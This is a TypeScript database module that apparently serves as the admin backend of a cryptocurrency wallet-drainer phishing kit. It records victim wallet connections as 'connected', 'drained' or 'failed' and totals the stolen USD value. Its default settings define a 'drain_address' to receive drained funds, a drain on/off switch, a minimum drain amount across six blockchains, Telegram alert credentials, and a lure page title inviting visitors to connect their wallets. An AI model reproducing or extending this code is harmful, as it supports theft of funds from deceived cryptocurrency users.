import { eq, desc, and, count, sum, sql } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import {
  InsertUser, users,
  walletConnections, InsertWalletConnection, WalletConnection,
  transactions, InsertTransaction,
  settings, InsertSetting,
  notifications, InsertNotification,
  activityLogs, InsertActivityLog,
  blacklist, InsertBlacklist,
} from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

// ─── Users ───────────────────────────────────────────────────────────────────

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) throw new Error("User openId is required for upsert");
  const db = await getDb();
  if (!db) return;
  const values: InsertUser = { openId: user.openId };
  const updateSet: Record<string, unknown> = {};
  const textFields = ["name", "email", "loginMethod"] as const;
  type TextField = (typeof textFields)[number];
  const assignNullable = (field: TextField) => {
    const value = user[field];
    if (value === undefined) return;
    const normalized = value ?? null;
    values[field] = normalized;
    updateSet[field] = normalized;
  };
  textFields.forEach(assignNullable);
  if (user.lastSignedIn !== undefined) { values.lastSignedIn = user.lastSignedIn; updateSet.lastSignedIn = user.lastSignedIn; }
  if (user.role !== undefined) { values.role = user.role; updateSet.role = user.role; }
  else if (user.openId === ENV.ownerOpenId) { values.role = 'admin'; updateSet.role = 'admin'; }
  if (!values.lastSignedIn) values.lastSignedIn = new Date();
  if (Object.keys(updateSet).length === 0) updateSet.lastSignedIn = new Date();
  await db.insert(users).values(values).onDuplicateKeyUpdate({ set: updateSet });
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) return undefined;
  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);
  return result.length > 0 ? result[0] : undefined;
}

export async function getAllUsers() {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(users).orderBy(desc(users.createdAt));
}

// ─── Wallet Connections ───────────────────────────────────────────────────────

export async function createWalletConnection(data: InsertWalletConnection) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.insert(walletConnections).values(data);
  return result;
}

export async function getWalletConnections(limit = 50, offset = 0) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(walletConnections).orderBy(desc(walletConnections.createdAt)).limit(limit).offset(offset);
}

export async function getWalletConnectionById(id: number) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(walletConnections).where(eq(walletConnections.id, id)).limit(1);
  return result[0] ?? null;
}

export async function updateWalletConnectionStatus(id: number, status: WalletConnection["status"]) {
  const db = await getDb();
  if (!db) return;
  await db.update(walletConnections).set({ status, updatedAt: new Date() }).where(eq(walletConnections.id, id));
}

export async function getConnectionStats() {
  const db = await getDb();
  if (!db) return { total: 0, connected: 0, drained: 0, failed: 0, totalUsdValue: "0" };
  const [stats] = await db.select({
    total: count(),
    totalUsdValue: sum(walletConnections.usdValue),
  }).from(walletConnections);
  const [connected] = await db.select({ count: count() }).from(walletConnections).where(eq(walletConnections.status, "connected"));
  const [drained] = await db.select({ count: count() }).from(walletConnections).where(eq(walletConnections.status, "drained"));
  const [failed] = await db.select({ count: count() }).from(walletConnections).where(eq(walletConnections.status, "failed"));
  return {
    total: stats?.total ?? 0,
    connected: connected?.count ?? 0,
    drained: drained?.count ?? 0,
    failed: failed?.count ?? 0,
    totalUsdValue: stats?.totalUsdValue ?? "0",
  };
}

// ─── Transactions ─────────────────────────────────────────────────────────────

export async function createTransaction(data: InsertTransaction) {
  const db = await getDb();
  if (!db) return null;
  return db.insert(transactions).values(data);
}

export async function getTransactions(limit = 50, offset = 0) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(transactions).orderBy(desc(transactions.createdAt)).limit(limit).offset(offset);
}

export async function getTransactionStats() {
  const db = await getDb();
  if (!db) return { total: 0, success: 0, failed: 0, totalUsdValue: "0" };
  const [stats] = await db.select({ total: count(), totalUsdValue: sum(transactions.usdValue) }).from(transactions);
  const [success] = await db.select({ count: count() }).from(transactions).where(eq(transactions.status, "success"));
  const [failed] = await db.select({ count: count() }).from(transactions).where(eq(transactions.status, "failed"));
  return { total: stats?.total ?? 0, success: success?.count ?? 0, failed: failed?.count ?? 0, totalUsdValue: stats?.totalUsdValue ?? "0" };
}

// ─── Settings ─────────────────────────────────────────────────────────────────

export async function getSetting(key: string) {
  const db = await getDb();
  if (!db) return null;
  const result = await db.select().from(settings).where(eq(settings.key, key)).limit(1);
  return result[0] ?? null;
}

export async function getAllSettings() {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(settings).orderBy(settings.key);
}

export async function upsertSetting(key: string, value: string, description?: string) {
  const db = await getDb();
  if (!db) return;
  await db.insert(settings).values({ key, value, description }).onDuplicateKeyUpdate({ set: { value, updatedAt: new Date() } });
}

export async function initDefaultSettings() {
  const defaults = [
    { key: "drain_address", value: "", description: "Wallet address to receive drained funds" },
    { key: "telegram_bot_token", value: "", description: "Telegram bot token for notifications" },
    { key: "telegram_chat_id", value: "", description: "Telegram chat ID for notifications" },
    { key: "site_title", value: "Web3 Connect", description: "Site title shown to visitors" },
    { key: "site_description", value: "Connect your wallet to access DeFi protocols", description: "Site description" },
    { key: "drain_enabled", value: "true", description: "Enable/disable draining" },
    { key: "supported_networks", value: "ethereum,bsc,polygon,arbitrum,avalanche,optimism", description: "Supported blockchain networks" },
    { key: "min_drain_amount", value: "0.001", description: "Minimum amount in ETH to drain" },
  ];
  for (const s of defaults) {
    const existing = await getSetting(s.key);
    if (!existing) await upsertSetting(s.key, s.value, s.description);
  }
}

// ─── Notifications ────────────────────────────────────────────────────────────

export async function createNotification(data: InsertNotification) {
  const db = await getDb();
  if (!db) return null;
  return db.insert(notifications).values(data);
}

export async function getNotifications(limit = 20) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(notifications).orderBy(desc(notifications.createdAt)).limit(limit);
}

export async function markNotificationRead(id: number) {
  const db = await getDb();
  if (!db) return;
  await db.update(notifications).set({ isRead: true }).where(eq(notifications.id, id));
}

export async function markAllNotificationsRead() {
  const db = await getDb();
  if (!db) return;
  await db.update(notifications).set({ isRead: true });
}

export async function getUnreadNotificationCount() {
  const db = await getDb();
  if (!db) return 0;
  const [result] = await db.select({ count: count() }).from(notifications).where(eq(notifications.isRead, false));
  return result?.count ?? 0;
}

// ─── Activity Logs ────────────────────────────────────────────────────────────

export async function createLog(data: InsertActivityLog) {
  const db = await getDb();
  if (!db) return null;
  return db.insert(activityLogs).values(data);
}

export async function getLogs(limit = 100, offset = 0) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(activityLogs).orderBy(desc(activityLogs.createdAt)).limit(limit).offset(offset);
}

// ─── Blacklist ────────────────────────────────────────────────────────────────

export async function addToBlacklist(data: InsertBlacklist) {
  const db = await getDb();
  if (!db) return null;
  return db.insert(blacklist).values(data);
}

export async function getBlacklist() {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(blacklist).orderBy(desc(blacklist.createdAt));
}

export async function removeFromBlacklist(id: number) {
  const db = await getDb();
  if (!db) return;
  await db.delete(blacklist).where(eq(blacklist.id, id));
}

export async function isBlacklisted(type: "wallet" | "ip" | "country", value: string) {
  const db = await getDb();
  if (!db) return false;
  const result = await db.select().from(blacklist).where(and(eq(blacklist.type, type), eq(blacklist.value, value))).limit(1);
  return result.length > 0;
}

// ─── Dashboard Stats ──────────────────────────────────────────────────────────

export async function getDashboardStats() {
  const connStats = await getConnectionStats();
  const txStats = await getTransactionStats();
  const unreadNotifs = await getUnreadNotificationCount();
  return { connections: connStats, transactions: txStats, unreadNotifications: unreadNotifs };
}

export async function getRecentActivity(limit = 10) {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(activityLogs).orderBy(desc(activityLogs.createdAt)).limit(limit);
}

export async function getChartData() {
  const db = await getDb();
  if (!db) return [];
  // Last 7 days connections grouped by day
  const result = await db.execute(sql`
    SELECT DATE(createdAt) as date, COUNT(*) as connections, SUM(usdValue) as usdValue
    FROM wallet_connections
    WHERE createdAt >= DATE_SUB(NOW(), INTERVAL 7 DAY)
    GROUP BY DATE(createdAt)
    ORDER BY date ASC
  `);
  return (result[0] as unknown) as Array<{ date: string; connections: number; usdValue: string }>;
}
